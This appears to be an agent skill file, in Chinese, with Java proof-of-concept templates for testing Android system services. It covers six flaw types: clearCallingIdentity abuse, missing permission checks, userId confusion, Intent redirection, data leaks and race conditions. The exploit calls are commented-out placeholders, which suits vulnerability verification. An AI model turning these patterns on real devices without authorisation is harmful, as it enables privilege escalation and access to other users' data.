---
name: poc-framework-service
description: 系统服务攻击 PoC — 覆盖 clearCallingIdentity 滥用、权限缺失、身份混淆、Intent 重定向、数据泄露、竞态条件 6 种漏洞类型
---

# 系统服务攻击 PoC

系统服务运行于 system_server 或特权进程，拥有高权限。攻击面包括身份混淆、权限检查缺失、Intent 重定向等。

> **注意**：`ServiceManager` 是隐藏 API，标准 SDK 不可用，以下模板需要通过反射访问或添加 stub JAR 才能编译。实际利用需要 root 或系统应用权限，不满足第三方 app 无特殊权限的利用条件。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| clearCallingIdentity 滥用 | HIGH | `FrameworkClearIdentityExploit` |
| 权限检查缺失 | HIGH | `FrameworkPermissionMissingExploit` |
| 身份混淆 | HIGH | `FrameworkIdentityConfusionExploit` |
| Intent 重定向 | HIGH | `FrameworkIntentRedirectExploit` |
| 数据泄露 | MEDIUM | `FrameworkDataLeakExploit` |
| 竞态条件 | HIGH | `FrameworkRaceConditionExploit` |

## FrameworkClearIdentityExploit

利用系统服务 clearCallingIdentity 范围过大，以 system 身份执行特权操作。

```java
public class FrameworkClearIdentityExploit extends Exploit {
    @Override
    public void execute() {
        try {
            // 获取系统服务 Binder 接口
            IBinder binder = ServiceManager.getService("target_system_service");
            // 需通过反射或已知接口调用方法
            // 方法在 clearCallingIdentity/restoreCallingIdentity 之间执行
            // 此时代码以 system 身份运行，可访问任意数据

            // 示例：通过 Binder 调用暴露的方法
            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // service.vulnerableMethod(); // 内部 clearCallingIdentity 后无权限检查

            log("Framework clearCallingIdentity — requires system service access");
            log("Typical scenario: call method that performs privileged file ops");
        } catch (Exception e) {
            log("Failed: " + e.getMessage());
        }
    }
}
```

> 注意：系统服务攻击通常需要 root 或特定权限。PoC 重点是验证漏洞路径是否存在。

## FrameworkPermissionMissingExploit

调用系统服务未做权限检查的公开方法。

```java
public class FrameworkPermissionMissingExploit extends Exploit {
    @Override
    public void execute() {
        try {
            // 获取系统服务
            IBinder binder = ServiceManager.getService("vulnerable_service");

            // 直接调用未做 enforceCallingPermission 的方法
            // 例如：读取其他用户数据、修改系统设置
            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // String data = service.getProtectedData(userId);

            log("Framework permission missing — verify method lacks enforceCallingPermission");
            log("Call method without required permission and check if it succeeds");
        } catch (Exception e) {
            log("Failed: " + e.getMessage());
        }
    }
}
```

## FrameworkIdentityConfusionExploit

利用系统服务信任调用方传入的 userId 参数而非 Binder.getCallingUid()。

```java
public class FrameworkIdentityConfusionExploit extends Exploit {
    @Override
    public void execute() {
        try {
            IBinder binder = ServiceManager.getService("vulnerable_service");

            // 服务方法接受 userId 参数而非使用 getCallingUid()
            // 攻击者传入其他用户的 userId 访问其数据
            int targetUserId = 0; // 目标用户 ID

            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // String data = service.getUserData(targetUserId);
            // log("Accessed user " + targetUserId + " data: " + data);

            log("Framework identity confusion — service trusts caller-passed userId");
            log("Try passing different userId values to access other users' data");
        } catch (Exception e) {
            log("Failed: " + e.getMessage());
        }
    }
}
```

## FrameworkIntentRedirectExploit

利用系统服务转发未校验的 Intent，以 system 权限启动任意组件。

```java
public class FrameworkIntentRedirectExploit extends Exploit {
    @Override
    public void execute() {
        try {
            IBinder binder = ServiceManager.getService("vulnerable_service");

            // 构造指向非导出特权组件的 Intent
            Intent maliciousIntent = new Intent();
            maliciousIntent.setClassName("com.target", "com.target.InternalPrivilegedActivity");

            // 系统服务以 system 权限启动此 Intent
            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // service.startActivity(maliciousIntent);

            log("Framework intent redirect — service forwards Intent as system");
            log("Target non-exported component that requires system permission");
        } catch (Exception e) {
            log("Failed: " + e.getMessage());
        }
    }
}
```

## FrameworkDataLeakExploit

调用系统服务返回敏感数据的方法，未校验调用方身份。

```java
public class FrameworkDataLeakExploit extends Exploit {
    @Override
    public void execute() {
        try {
            IBinder binder = ServiceManager.getService("vulnerable_service");

            // 调用返回敏感信息的方法（设备信息、用户数据、系统配置）
            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // List<String> data = service.getSensitiveInfo();

            log("Framework data leak — service returns data without caller validation");
            log("Query sensitive endpoints and check data accessibility");
        } catch (Exception e) {
            log("Failed: " + e.getMessage());
        }
    }
}
```

## FrameworkRaceConditionExploit

利用系统服务 check-then-act 操作的竞态窗口。

```java
public class FrameworkRaceConditionExploit extends Exploit {
    @Override
    public void execute() {
        int threadCount = 10;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch latch = new CountDownLatch(threadCount);

        for (int i = 0; i < threadCount; i++) {
            final int threadId = i;
            executor.submit(() -> {
                try {
                    IBinder binder = ServiceManager.getService("vulnerable_service");
                    // 并发调用同一方法，利用 TOCTOU 竞态
                    // 例如：检查权限后执行操作的窗口
                    // ITargetService service = ITargetService.Stub.asInterface(binder);
                    // service.raceConditionMethod(threadId);
                    log("Thread " + threadId + " — sent request");
                } catch (Exception e) {
                    log("Thread " + threadId + " failed: " + e.getMessage());
                } finally {
                    latch.countDown();
                }
            });
        }

        try {
            latch.await(10, TimeUnit.SECONDS);
            log("Race condition test completed");
        } catch (InterruptedException e) {
            log("Test interrupted");
        }
        executor.shutdown();
    }
}
```
